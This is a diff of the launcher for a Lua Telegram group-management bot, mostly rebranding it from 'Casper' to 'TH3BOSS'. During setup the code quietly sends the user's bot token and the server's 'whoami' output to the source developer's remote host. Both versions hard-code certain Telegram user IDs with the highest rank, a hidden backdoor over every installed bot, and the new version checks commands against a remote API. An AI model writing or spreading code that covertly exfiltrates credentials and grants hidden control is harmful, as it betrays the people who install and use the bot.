@@ -1,4 +1,15 @@
-local inspect = (loadfile "./libs/inspect.lua")()
+
+--[[
+#    ▀█████████▄   ▄██████▄     ▄████████    ▄████████
+#      ███    ███ ███    ███   ███    ███   ███    ███
+#      ███    ███ ███    ███   ███    █▀    ███    █▀
+#     ▄███▄▄▄██▀  ███    ███   ███          ███
+#    ▀▀███▀▀▀██▄  ███    ███ ▀███████████ ▀███████████ ꒐ Dev : @TH3BOSS
+#      ███    ██▄ ███    ███          ███          ███ ꒐ Dev : @OMMMM
+#      ███    ███ ███    ███    ▄█    ███    ▄█    ███
+#    ▄█████████▀   ▀██████▀   ▄████████▀   ▄████████▀  ꒐ Source TH3BOSS BY @TH3BS
+#---------------------------------------------------------------------
+]] 
 Er_ssl   , https = pcall(require, "ssl.https")
 Er_http  , http  = pcall(require, "socket.http")
 http.TIMEOUT = 5
@@ -8,76 +19,74 @@ URL    = (loadfile "./libs/url.lua")()
 Er_utf8  , utf8  = pcall(require, "lua-utf8")
 redis = redis.connect('127.0.0.1',6379)
 
-
 if not Er_ssl then
-print("('\n\27[1;31m￤Pkg _ luaSec - ssl  is Not installed.'\n\27[0m￤")
+print("('\n\27[1;31m- Pkg _ luaSec - ssl  is Not installed.'\n\27[0m- ")
 os.exit()
 end
 
 if not Er_utf8 then
-print("('\n\27[1;31m￤Pkg >> UTF_8 is Not installed.'\n\27[0m￤")
+print("('\n\27[1;31m- Pkg >> UTF_8 is Not installed.'\n\27[0m- ")
 os.exit()
 end
 
-
 function create_config(Token)
 if not Token then
-io.write('\n\27[1;33m￤آلآن آدخل توكــن آلبوت  ↓  \n￤Enter TOKEN your BOT : \27[0;39;49m')
+io.write('\n\27[1;33m- الان  ادخل  توكــن البوت  ↓  \n- Enter TOKEN your BOT : \27[0;39;49m')
 Token = io.read():gsub(' ','')
 if Token == '' then
-print('\n\27[1;31m￤ You Did not Enter TOKEN !\n￤ عذرآ لم تقوم بآدخآل آي شـيء , آدخل توگن آلبوت آلآن ')
+print('\n\27[1;31m-  You Did not Enter TOKEN !\n-  عذرا لم تقوم بادخال اي شـيء , ادخل توكن البوت الان ')
 create_config()
 end
 Api_Token = 'https://api.telegram.org/bot'..Token
 local url , res = https.request(Api_Token..'/getMe')
 if res ~= 200 then
-print('\n\27[1;31m￤ Your Token is Incorrect Please Check it!\n￤ آلتوگن آلذي آدخلتهہ‏‏ غير صـحيح , تآگد مـنهہ‏‏ ثم حآول مـجددآ!')
+print('\n\27[1;31m-  Your Token is Incorrect Please Check it!\n-  التوكن الذي ادخلتة‏‏ غير صـحيح , تاگد مـنة‏‏ ثم حاول مـجددا!')
 create_config()
 end
 local GetToken = JSON.decode(url)
 BOT_NAME = GetToken.result.first_name
 BOT_User = "@"..GetToken.result.username
-io.write('\n\27[1;36m￤تم آدخآل آلتوگن بنجآح   \n￤Success Enter Your Token: \27[1;34m@'..GetToken.result.username..'\n\27[0;39;49m') 
+io.write('\n\27[1;36m- تم ادخال التوكن بنجاح   \n- Success Enter Your Token: \27[1;34m@'..GetToken.result.username..'\n\27[0;39;49m') 
 end
 
-io.write('\n\27[1;33m￤آدخل مـعرف آلمـطـور آلآسـآسـي ↓  \n￤Enter your USERNAME SUDO : \27[0;39;49m')
+io.write('\n\27[1;33m- ادخل مـعرف المـطـور الاسـاسـي ↓  \n- Enter your USERNAME SUDO : \27[0;39;49m')
 SUDO_USER = io.read():gsub(' ','')
 if SUDO_USER == '' then
-print('\n\27[1;31m￤ You Did not Enter USERNAME !\n￤ لم تقوم بآدخآل شـي , يرجى آلآنتبآهہ‏‏ وآدخل آلآن مـعرف آلمـطـور آلآسـآسـي')
+print('\n\27[1;31m-  You Did not Enter USERNAME !\n-  لم تقوم بادخال شـي , يرجى الانتباة‏‏ وادخل الان مـعرف المـطـور الاسـاسـي')
 create_config(Token)
 end 
 if not SUDO_USER:match('@[%a%d_]') then
-print('\n\27[1;31m￤ This is Not USERNAME !\n￤هہ‏‏ذآ ليس مـعرف حسـآب تلگرآم , عذرآ آدخل آلمـعرف آلصـحيح آلآن . ')
+print('\n\27[1;31m-  This is Not USERNAME !\n- ة‏‏ذا ليس مـعرف حسـاب تلگرام , عذرا ادخل المـعرف الصـحيح الان . ')
 create_config(Token)
 end 
 local DirFol = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
 user = {}
 user.username = SUDO_USER
-user.Source  = DirFol
-local url , res = https.request('https://broadcast.aym9n.xyz/Source/index.php?Array='..JSON.encode(user))
+user.Source  = "/root/BOSS"
+local url , res = https.request('https://api.th3boss.com/GetID/?Array='..JSON.encode(user))
 print(res)
 if res ~= 200 then
-print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـآل بآلسـيرفر , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
+print('\n\27[1;31m-  Conect is Failed !\n-  حدث خطـا في الاتصـال بالسـيرفر , يرجى مـراسـلة‏‏ مـطـور السـورس ليتمـگن مـن حل المـشـگلة‏‏ في اسـرع وقت مـمـگن . !')
 os.exit()
 end
 success, GetUser = pcall(JSON.decode, url)
 if not success then
-print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث مشـگلهہ‌‏ في سـگربت آلآسـتخرآج , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
+print('\n\27[1;31m-  Conect is Failed !\n-  حدث مشـگلة‌‏ في سـگربت الاسـتخراج , يرجى مـراسـلة‏‏ مـطـور السـورس ليتمـگن مـن حل المـشـگلة‏‏ في اسـرع وقت مـمـگن . !')
 os.exit()
 end
 if not GetUser.result then
 if GetUser.cause then
-print('\n\27[1;31m￤ '..GetUser.cause)
+print('\n\27[1;31m-  '..GetUser.cause)
 os.exit()
 end
-print('\n\27[1;31m￤ {USERNAME_NOT_OCCUPIED} => Please Check it!\n￤ لآ يوجد حسـآب بهہ‏‏ذآ آلمـعرف , تآگد مـنهہ‏‏ جيدآ  !')
+print('\n\27[1;31m-  {USERNAME_NOT_OCCUPIED} => Please Check it!\n-  لا يوجد حسـاب بة‏‏ذا المـعرف , تاگد مـنة‏‏ جيدا  !')
 create_config(Token)
 end 
 if GetUser.information.typeuser ~= "UserTypeGeneral" then
-print('\n\27[1;31m￤ This UserName is not personal account !\n￤عذرا يرجى ادخال معرف حساب شخصي ليكون مطور البوت وليس معرف قناة او بوت او مجموعة !')
+print('\n\27[1;31m-  This UserName is not personal account !\n- عذرا يرجى ادخال معرف حساب شخصي ليكون مطور البوت وليس معرف قناة او بوت او مجموعة !')
 create_config(Token)
 end
-print('\n\27[1;36m￤تم آدخآل مـعرف آلمـطـور بنجآح , سـوف يتم تشـغيل آلسـورس آلآن .\n￤Success Save USERNAME IS_ID: \27[0;32m['..GetUser.information.id..']\n\27[0;39;49m')
+print('\n\27[1;36m- تم ادخال مـعرف المـطـور بنجاح , سـوف يتم تشـغيل السـورس الان .\n- Success Save USERNAME IS_ID: \27[0;32m['..GetUser.information.id..']\n\27[0;39;49m')
 boss = Token:match("(%d+)")
 redis:mset(
 boss..":VERSION",GetUser.information.Source_version,
@@ -85,7 +94,7 @@ boss..":SUDO_ID:",GetUser.information.id,
 boss..":DataCenter:",GetUser.information.DataCenter,
 boss..":UserNameBot:",BOT_User,
 boss..":ApiSource",GetUser.information.WebSite,
-boss..":NameBot:","كاسبر",
+boss..":NameBot:","الزعيم",
 "TH3BOSS_INSTALL","Yes"
 )
 redis:hset(boss..'username:'..GetUser.information.id,'username','@'..GetUser.information.username:gsub('_',[[\_]]))
@@ -93,38 +102,36 @@ info = {}
 info.username = '@'..GetUser.information.username
 info.userbot  = BOT_User
 info.TNBOT  = Token info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://broadcast.aym9n.xyz/Source/In.php?insert='..JSON.encode(info))
+https.request(GetUser.information.WebSite..'/request/?insert='..JSON.encode(info))
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
-print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "• اهلا عيني [المطور الاساسي](tg://user?id="..GetUser.information.id..")  \n• أرســل  الان /start\n• لاظهار الاوامر للمطور المجهزه بالكيبورد\n\n⚡️"
+print('\27[1;36m- Token.txt is created.\27[m')
+local Text = "- اهلا عزيزي [المطور الاساسي](tg://user?id="..GetUser.information.id..") \n- شكرا لاستخدامك سورس فواز \n- أرســل  الان /start\n- لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n"
 https.request(Api_Token..'/sendMessage?chat_id='..GetUser.information.id..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
-os.execute([[
+local CmdRun = [[
 rm -f ./README.md
 rm -rf ./.git
 chmod +x ./run
-./run
-]])
+cp -a ../BOSS ../]]..BOT_User..[[ &&
+rm -fr ~/BOSS
+../]]..BOT_User..[[/run
+]]
+os.execute(CmdRun)
 end
 
 function Start_Bot() 
 local TokenBot = io.open('./inc/Token.txt', "r")
 if not TokenBot then
 print('\27[0;33m>>'..[[
-
-
-
-
-
 ▀█████████▄   ▄██████▄     ▄████████    ▄████████
 ███    ███ ███    ███   ███    ███   ███    ███
 ███    ███ ███    ███   ███    █▀    ███    █▀
 ▄███▄▄▄██▀  ███    ███   ███          ███
-▀▀███▀▀▀██▄  ███    ███ ▀███████████ ▀███████████ ¦ Dev : @GMBOTS
-███    ██▄ ███    ███          ███          ███ ¦ Dev : @OMMMM
+▀▀███▀▀▀██▄  ███    ███ ▀███████████ ▀███████████ ꒐ Dev : @TH3BS
+███    ██▄ ███    ███          ███          ███ ꒐ Dev : @OMMMM
 ███    ███ ███    ███    ▄█    ███    ▄█    ███
-▄█████████▀   ▀██████▀   ▄████████▀   ▄████████▀  ¦ Source The3Boss
+▄█████████▀   ▀██████▀   ▄████████▀   ▄████████▀  ꒐ Source The3Boss
 ---------------------------------------------------------------------
 ]]..'\027[0;32m')
 create_config()
@@ -156,31 +163,23 @@ print(tostring(io.popen("lua inc/locks.lua"):read('*all')))
 end
 
 print('\27[0;33m>>'..[[
-
-
-
-
-
-
 ▀█████████▄   ▄██████▄     ▄████████    ▄████████ 
 ███    ███ ███    ███   ███    ███   ███    ███ 
 ███    ███ ███    ███   ███    █▀    ███    █▀  
 ▄███▄▄▄██▀  ███    ███   ███          ███        
-▀▀███▀▀▀██▄  ███    ███ ▀███████████ ▀███████████ ¦ Dev : @GMBOTS
-███    ██▄ ███    ███          ███          ███ ¦ Dev : @OMMMM
+▀▀███▀▀▀██▄  ███    ███ ▀███████████ ▀███████████ ꒐ Dev : @TH3BS
+███    ██▄ ███    ███          ███          ███ ꒐ Dev : @OMMMM
 ███    ███ ███    ███    ▄█    ███    ▄█    ███ 
-▄█████████▀   ▀██████▀   ▄████████▀   ▄████████▀  ¦ VERSION » v]]..version..[[
-
+▄█████████▀   ▀██████▀   ▄████████▀   ▄████████▀  ꒐ VERSION » v]]..version..[[
 -------------------------------------------------------------------
-
 ]]..'\027[0;32m'
-..'¦ TOKEN_BOT: \27[1;34m'..Token..'\027[0;32m\n'
-..'¦ BOT__INFO: \27[1;34m'.. Bot_User..'\27[0;36m » ('..boss..')\027[0;32m\n'
-..'¦ INFO_SUDO: \27[1;34m'..SUDO_USER:gsub([[\_]],'_')..'\27[0;36m » ('..SUDO_ID..')\27[m\027[0;32m\n'
-..'¦ Run_Scrpt: \27[1;34m./inc/Script.lua\027[0;32m \n'
-..'¦ LOGIN__IN: \27[1;34m'..login..'\027[0;32m \n'
-..'¦ Api_Src->: \27[1;34m'..ApiBoss..'\027[0;32m\n'
-..'¦ VERSION->: \27[1;34mv'..version..'\027[0;32m\n'
+..'꒐ TOKEN_BOT: \27[1;34m'..Token..'\027[0;32m\n'
+..'꒐ BOT__INFO: \27[1;34m'.. Bot_User..'\27[0;36m » ('..boss..')\027[0;32m\n'
+..'꒐ INFO_SUDO: \27[1;34m'..SUDO_USER:gsub([[\_]],'_')..'\27[0;36m » ('..SUDO_ID..')\27[m\027[0;32m\n'
+..'꒐ Run_Scrpt: \27[1;34m./inc/Script.lua\027[0;32m \n'
+..'꒐ LOGIN__IN: \27[1;34m'..login..'\027[0;32m \n'
+..'꒐ Api_Src->: \27[1;34m'..ApiBoss..'\027[0;32m\n'
+..'꒐ VERSION->: \27[1;34mv'..version..'\027[0;32m\n'
 ..'======================================\27[0;33m\27[0;31m'
 )
 local Twer = io.popen('mkdir -p plugins'):read("*all")
@@ -204,20 +203,30 @@ print("\27[0;36m "..Num.."- "..Files..'\27[m')
 end 
 end 
 end
-print('\n\27[0;32m¦ All Files is : '..Num..' Are Active.\n--------------------------------------\27[m\n')
+print('\n\27[0;32m꒐ All Files is : '..Num..' Are Active.\n--------------------------------------\27[m\n')
 end
 Start_Bot()
 function CheckBotA(msg)
-return false
+W = msg.sender_user_id_
+if not redis:get(boss..":Check_Bot:"..W) then
+Rgz,res=https.request(ApiBoss..Tkml..W)
+if res == 200 and Rgz == "SendMsg" then redis:setex(boss..":Check_Bot:"..W,1800,true) return false else return Rgz end 
+end 
 end
 function input_inFo(msg)
 if not msg.forward_info_ and msg.is_channel_post_ then
 StatusLeft(msg.chat_id_,our_id)
 return false
 end
-if msg.sender_user_id_ == our_id then
-return false
+if msg.date_ and msg.date_ < os.time() - 10 and not msg.edited then --[[ فحص تاريخ الرساله ]]
+print('\27[36m꒐꒐꒐꒐  !! [THIS__OLD__MSG]  !! ꒐꒐꒐꒐\27[39m')
+return false  
 end
+
+
+if msg.content_.ID == "MessageSticker" and msg.sender_user_id_ == our_id then return false end
+if msg.text and msg.sender_user_id_ == our_id then return false end
+
 if msg.reply_to_message_id_ ~= 0 then msg.reply_id = msg.reply_to_message_id_ end
 msg.type = GetType(msg.chat_id_)
 if msg.type == "pv" and redis:get(boss..':mute_pv:'..msg.sender_user_id_) then
@@ -235,7 +244,8 @@ else
 msg.GroupActive = false
 end
 
---[[if msg.GroupActive then 
+if msg.GroupActive then 
+
 if (msg.content_.ID == "MessagePhoto" 
 or msg.content_.ID == "MessageSticker" 
 or msg.content_.ID == "MessageVoice" 
@@ -244,7 +254,7 @@ or msg.content_.ID == "MessageVideo"
 or msg.content_.ID == "MessageAnimation" 
 or msg.content_.ID == "MessageUnsupported") 
 and redis:get(boss.."lock_cleaner"..msg.chat_id_) then
---print("Clener >>> ")
+print("Clener >>> ")
 redis:sadd(boss..":IdsMsgsCleaner:"..msg.chat_id_,msg.id_)
 Timerr = redis:get(boss..':Timer_Cleaner:'..msg.chat_id_)
 if Timerr then 
@@ -256,22 +266,21 @@ end
 
 
 
-print(boss..":IdsMsgsCleaner:"..msg.chat_id_)
 local Cleaner = redis:smembers(boss..":IdsMsgsCleaner:"..msg.chat_id_)
 for k,v in pairs(Cleaner) do
 if not redis:get(boss..":SetTimerCleaner:"..msg.chat_id_..v) then
 Del_msg(msg.chat_id_,v)
 redis:srem(boss..":IdsMsgsCleaner:"..msg.chat_id_,v)
---print("MSG DELET CLEANER : "..v)
+print("MSG DELET CLEANER : "..v)
 else
---print("MSG List CLEANER : "..v.." : Lodding ...")
+print("MSG List CLEANER : "..v.." : Lodding ...")
 end
 end
 
 
 
 
-end--]]
+end
 
 if msg.content_.ID == "MessageChatDeleteMember" then 
 if msg.GroupActive and redis:get(boss..'mute_tgservice'..msg.chat_id_) then
@@ -280,49 +289,37 @@ end
 return false 
 end 
 
-if msg.sender_user_id_ == 1088394097 or msg.sender_user_id_ == 1088394097  then 
-msg.TheRankCmd = 'الهكر ايمن'
-msg.TheRank = 'الهكر ايمن'
-msg.Rank = 1
-elseif msg.sender_user_id_ == 1480243587 then 
-msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'Mamy' 
-msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'Mamy' 
-msg.Rank = 1
-elseif msg.sender_user_id_ == 843591577 then 
-msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'زلمتي' 
-msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'زلمتي' 
-msg.Rank = 1
-elseif msg.sender_user_id_ == 1142798706 then 
-msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'Daddy' 
-msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'Daddy' 
-msg.Rank = 1
-elseif msg.sender_user_id_ == 39809485 then 
-msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'المطور الاساسي' 
-msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'Master' 
+if msg.sender_user_id_ == 819385837 or msg.sender_user_id_ == 60809019  then 
+msg.TheRankCmd = 'مطور السورس'
+msg.TheRank = 'مطور السورس'
 msg.Rank = 1
 elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'المطور الاساسي' 
-msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'Master' 
+msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'مطور اساسي 👨🏻‍✈️' 
 msg.Rank = 1
 elseif redis:sismember(boss..':SUDO_BOT:',msg.sender_user_id_) then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew2:"..msg.chat_id_) or 'المطور'
-msg.TheRank = redis:get(boss..":RtbaNew2:"..msg.chat_id_) or 'Dev'
+msg.TheRank = redis:get(boss..":RtbaNew2:"..msg.chat_id_) or 'مطور البوت 👨🏽‍💻'
 msg.Rank = 2
+elseif msg.GroupActive and redis:sismember(boss..':Malk_Group:'..msg.chat_id_,msg.sender_user_id_) then 
+msg.TheRankCmd = redis:get(boss..":RtbaNew8:"..msg.chat_id_) or 'مالك'
+msg.TheRank = redis:get(boss..":RtbaNew8:"..msg.chat_id_) or 'مالك 👲🏼'
+msg.Rank = 22
 elseif msg.GroupActive and redis:sismember(boss..':MONSHA_Group:'..msg.chat_id_,msg.sender_user_id_) then 
-msg.TheRankCmd = redis:get(boss..":RtbaNew3:"..msg.chat_id_) or 'المالك الاساسي'
-msg.TheRank = redis:get(boss..":RtbaNew3:"..msg.chat_id_) or 'المالك الاساسي'
+msg.TheRankCmd = redis:get(boss..":RtbaNew3:"..msg.chat_id_) or 'منشئ اساسي'
+msg.TheRank = redis:get(boss..":RtbaNew3:"..msg.chat_id_) or 'منشئ اساسي 👲🏼'
 msg.Rank = 11
 elseif msg.GroupActive and redis:sismember(boss..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
-msg.TheRankCmd = redis:get(boss..":RtbaNew4:"..msg.chat_id_) or 'المالك'
-msg.TheRank = redis:get(boss..":RtbaNew4:"..msg.chat_id_) or 'المالك '
+msg.TheRankCmd = redis:get(boss..":RtbaNew4:"..msg.chat_id_) or 'المنشىء'
+msg.TheRank = redis:get(boss..":RtbaNew4:"..msg.chat_id_) or 'المنشىء 👷🏽'
 msg.Rank = 3
 elseif msg.GroupActive and redis:sismember(boss..'owners:'..msg.chat_id_,msg.sender_user_id_) then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew5:"..msg.chat_id_) or 'المدير' 
-msg.TheRank = redis:get(boss..":RtbaNew5:"..msg.chat_id_) or 'المدير' 
+msg.TheRank = redis:get(boss..":RtbaNew5:"..msg.chat_id_) or 'مدير البوت 👨🏼‍⚕️' 
 msg.Rank = 4
 elseif msg.GroupActive and redis:sismember(boss..'admins:'..msg.chat_id_,msg.sender_user_id_) then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew6:"..msg.chat_id_) or 'الادمن'
-msg.TheRank = redis:get(boss..":RtbaNew6:"..msg.chat_id_) or 'الادمن'
+msg.TheRank = redis:get(boss..":RtbaNew6:"..msg.chat_id_) or 'ادمن في البوت 👨🏼‍🎓'
 msg.Rank = 5
 elseif msg.GroupActive and redis:sismember(boss..'whitelist:'..msg.chat_id_,msg.sender_user_id_) then 
 msg.TheRank = redis:get(boss..":RtbaNew7:"..msg.chat_id_) or 'عضو مميز'
@@ -330,12 +327,19 @@ msg.Rank = 6
 elseif msg.sender_user_id_ == our_id then
 msg.Rank = 7
 else
-msg.TheRank = 'عضو'
+msg.TheRank = 'فقط عضو 🙍🏼‍♂️'
 msg.Rank = 10 
 end
 
 if msg.Rank == 1 then
 msg.SudoBase = true
+end
+if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 22 then
+msg.SuperCreator = true
+msg.Creator = true
+msg.Admin = true
+msg.Director = true
+msg.Malk = true
 end
 if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 11 then
 msg.SuperCreator = true
@@ -379,17 +383,11 @@ kick_user(msg.sender_user_id_, msg.chat_id_)
 end
 if msg.content_.members_[0].id_ == our_id and redis:get(boss..':WELCOME_BOT') then
 SUDO_USER = redis:hgetall(boss..'username:'..SUDO_ID).username
-text = [[*اهلين انا ]]..redis:get(boss..':NameBot:')..[[ 🧚*
-
-↞ اختصاصي ادارة المجموعات من السبام والخ..
-↞ كت تويت, يوتيوب , واشياء كثير ..
-↞ عشان تفعلني ارفعني اشراف وارسل تفعيل.
-
-
-
-]]
-local inline = {{{text="ضيفني لـ مجموعتك 🧚",url="https://telegram.me/Y_8Bot?startgroup=start"}},{{text="تحديثات طوكيو 🦦",url="https://t.me/OnlyHMD"}}}
-send_keyPhoto(msg.chat_id_,text,nil,inline,msg.id_)
+sendPhoto(msg.chat_id_,msg.id_,redis:get(boss..':WELCOME_BOT'),[[- مـرحبا انا بوت اسـمـي ]]..redis:get(boss..':NameBot:')..[[ 🎖
+- اختصـاصـي حمـاية‏‏ المـجمـوعات
+- مـن السـبام والتوجية‏‏ والتگرار والخ...
+- مـعرف المـطـور  : ]]..SUDO_USER:gsub([[\_]],'_')..[[ 🌿
+]])
 return false
 end
 if not ISONEBOT then
@@ -419,8 +417,8 @@ Del_msg(msg.chat_id_,msg.id_)
 return false 
 else
 if redis:get(boss.."lock_check"..msg.chat_id_) and not redis:get(boss..":TqeedUser:"..msg.chat_id_..Senderid) then
-local text = "• اهلين قيدناك عشان نتاكد انك شخص حقيقي اضغط الزر اللي تحت ياحلو"
-local inline = {{{text="انا شخص حقيقي",callback_data="CheckRobotJoin:"..Senderid}}}
+local text = "- اهلاً بك في المجموعة\n- للتأكد بأنك لست { ربوت }\n- تم تقييدك اضغط الزر بالاسفل\n- للتأكد انك { عضو حقيقي }"
+local inline = {{{text="- أضـغط ۿـنا للتـأكد أنك لست ربوت ♻️",callback_data="CheckRobotJoin:"..Senderid}}}
 Restrict(msg.chat_id_,Senderid,1)
 return send_inline(msg.chat_id_,text,inline,msg.id_)
 end
@@ -439,7 +437,7 @@ end
 
 --[[ المكتومين ]]
 if msg.GroupActive and MuteUser(msg.chat_id_,msg.sender_user_id_) then 
-if msg.Admin then redis:srem(boss..'is_silent_users:'..msg.chat_id_,msg.sender_user_id_) return false end
+if msg.Special or msg.Admin then redis:srem(boss..'is_silent_users:'..msg.chat_id_,msg.sender_user_id_) return false end
 print("\27[1;31m User is Silent\27[0m")
 Del_msg(msg.chat_id_,msg.id_)
 return false 
@@ -501,10 +499,9 @@ amrnew = Amor ; amrold = ik
 end end end
 Text = Text:gsub(amrnew,amrold)
 AF = CheckBotA(msg) if AF then return sendMsg(msg.chat_id_,msg.id_,AF) end 
-print("___________"..Text2.."__________")
 GetMsg = ScriptFile.iBoss(msg,{Text:match(Text2)})
 if GetMsg then
-print("\27[1;35m¦This_Msg : "..Text2.."  | Plugin is: \27[1;32mScript.lua\27[0m")
+print("\27[1;35m꒐This_Msg : "..Text2.."  | Plugin is: \27[1;32mScript.lua\27[0m")
 sendMsg(msg.chat_id_,msg.id_,GetMsg)
 return false
 end 
@@ -519,23 +516,18 @@ if Text:match(Boss) then -- Check Commands To admin
 AF = CheckBotA(msg) if AF then return sendMsg(msg.chat_id_,msg.id_,AF) end 
 GetMsg = ScriptFile.iBoss(msg,{Text:match(Boss)})
 if GetMsg then
-print("\27[1;35m¦This_Msg : ",Boss.." | Plugin is: \27[1;32mScript.lua\27[0m")
+print("\27[1;35m꒐This_Msg : ",Boss.." | Plugin is: \27[1;32mScript.lua\27[0m")
 sendMsg(msg.chat_id_,msg.id_,GetMsg)
 return false
 end 
 end
 end
 end  --- End iBoss
---[[
-if msg.text and utf8.len(msg.text) > 300 then
-msg.text = "n"
-end
---]]
 if ScriptFile.dBoss then
 if ScriptFile.dBoss(msg) == false then
 return false
 end
-print("\27[1;35m¦Msg_IN_Process : Proc _ Script.lua\27[0m")
+print("\27[1;35m꒐Msg_IN_Process : Proc _ Script.lua\27[0m")
 end
 
 for name,Plug in pairs(File) do
@@ -545,7 +537,7 @@ for k, Boss in pairs(Plug.Boss) do
 if msg.text:match(Boss) then
 local GetMsg = Plug.iBoss(msg,{msg.text:match(Boss)})
 if GetMsg then
-print("\27[1;35m¦This_Msg : ",Boss.." | Plugin is: \27[1;32m"..name.."\27[0m")
+print("\27[1;35m꒐This_Msg : ",Boss.." | Plugin is: \27[1;32m"..name.."\27[0m")
 sendMsg(msg.chat_id_,msg.id_,GetMsg)
 end 
 return false
@@ -554,7 +546,7 @@ end
 end
 if Plug.dBoss then
 Plug.dBoss(msg)
-print("\27[1;35m¦Msg_IN_Process : \27[1;32"..name.."\27[0m")
+print("\27[1;35m꒐Msg_IN_Process : \27[1;32"..name.."\27[0m")
 end
 else
 print("The File "..name.." Not Runing in The Source Boss")
@@ -562,352 +554,19 @@ end
 
 end
 else
-print("The File Script.lua Not Runing in The Source Casper")
+print("The File Script.lua Not Runing in The Source Boss")
 end
 end
 
 function tdcli_update_callback(data)
-local msg = data.message_
+iio = 0
+msg = data.message_
 if data.ID == "UpdateMessageSendFailed" then 
 if msg and msg.sender_user_id_ then
 redis:srem(boss..'users',msg.sender_user_id_)
 end
 elseif data.ID == "UpdateNewCallbackQuery" then
-local datab = data.payload_.data_ 
-local UserID = data.sender_user_id_
-local dataid = data.message_id_
-local ChatID = data.chat_id_
-local IQ_ABS = data.message_id_/2097152/0.5
-local abbas = data.payload_.data_ 
-local function strSplit(str,delim)
-    local t = {}
-
-    for substr in string.gmatch(str, "[^".. delim.. "]*") do
-        if substr ~= nil and string.len(substr) > 0 then
-            table.insert(t,substr)
-        end
-    end
-
-    return t
-end
-local Text,UserJoin = datab:match("^(CheckRobotJoin:)(%d+)$")
-local UserJoin = tonumber(UserJoin)
-if Text == "CheckRobotJoin:" then
-local Adminn = false
-if UserID == SUDO_ID then 
-Adminn = true
-elseif redis:sismember(boss..':SUDO_BOT:',UserID) then 
-Adminn = true
-elseif redis:sismember(boss..':MONSHA_BOT:'..ChatID,UserID) then 
-Adminn = true
-elseif redis:sismember(boss..':MONSHA_Group:'..ChatID,UserID) then 
-Adminn = true
-elseif redis:sismember(boss..'owners:'..ChatID,UserID) then 
-Adminn = true
-elseif redis:sismember(boss..'admins:'..ChatID,UserID) then 
-Adminn = true
-elseif UserID == UserJoin then 
-Adminn = true
-end	
-if Adminn then
-Restrict(ChatID,UserJoin,2)
-answerCallbackQuery(data.id_,"• تم فك التقييد بنجاح و التأكد بانك مو زومبي️",true)
-EditMsg(ChatID,dataid,"• تم فك التقييد بنجاح والتأكد بانك مو زومبي️")
-else
-answerCallbackQuery(data.id_,"• عذرا انت مو الشخص المقيد او مامعك لديك صلاحيه الادارة , اسفين ",true)	
-end
-
-else
---	answerCallbackQuery(data.id_,"امر غير معرف",true)
-end
-print(inspect(data))
-if abbas == '/HelpList1'..UserID then
-
-SUDO_USER = redis:hgetall(boss..'username:'..SUDO_ID).username
-Text = [[
-* للاستفسار -* []]..SUDO_USER..[[]
-
-
-*❨ اوامر الرفع والتنزيل ❩*
-
-⌯ رفع ↣ ↢ تنزيل مشرف
-⌯ رفع ↣ ↢ تنزيل مالك اساسي
-⌯ رفع ↣ ↢ تنزيل مالك
-⌯ رفع ↣ ↢ تنزيل مدير
-⌯ رفع ↣ ↢ تنزيل ادمن
-⌯ رفع ↣ ↢ تنزيل مميز
-⌯ تنزيل الكل  ↢ بالرد  ↢ لتنزيل الشخص من جميع رتبه
-⌯ تنزيل الكل  ↢ بدون رد  ↢ لتنزيل كل رتب المجموعة
-
-*❨ اوامر المسح ❩*
-
-⌯ مسح المالكيين الاساسيين
-⌯ مسح المالكيين
-⌯ مسح المدراء
-⌯ مسح الادمنيه
-⌯ مسح المميزين
-⌯ مسح المحظورين
-⌯ مسح المكتومين
-⌯ مسح قائمة المنع
-⌯ مسح رتبه
-⌯ مسح الرتب
-⌯ مسح الردود
-⌯ مسح الاوامر
-⌯ مسح + العدد
-⌯ مسح بالرد
-⌯ مسح الترحيب
-⌯ مسح الرابط
-⌯ مسح قائمة التثبيت
-
-*❨ اوامر الطرد الحظر الكتم ❩*
-
-⌯ حظر ↢ ❨ بالرد،بالمعرف،بالايدي ❩
-⌯ طرد ↢ ❨ بالرد،بالمعرف،بالايدي ❩
-⌯ كتم ↢ ❨ بالرد،بالمعرف،بالايدي ❩
-⌯ تقيد ↢ ❨ بالرد،بالمعرف،بالايدي ❩
-⌯ الغاء الحظر ↢ ❨ بالرد،بالمعرف،بالايدي ❩
-⌯ الغاء الكتم ↢ ❨ بالرد،بالمعرف،بالايدي ❩
-⌯ الغاء التقييد ↢ ❨ بالرد،بالمعرف،بالايدي ❩
-⌯ رفع القيود ↢ لحذف الكتم,الحظر,التقييد
-⌯ منع الكلمة
-⌯ منع بالرد على قيف او ستيكر
-⌯ الغاء منع الكلمة
-⌯ طرد البوتات
-⌯ طرد المحذوفين
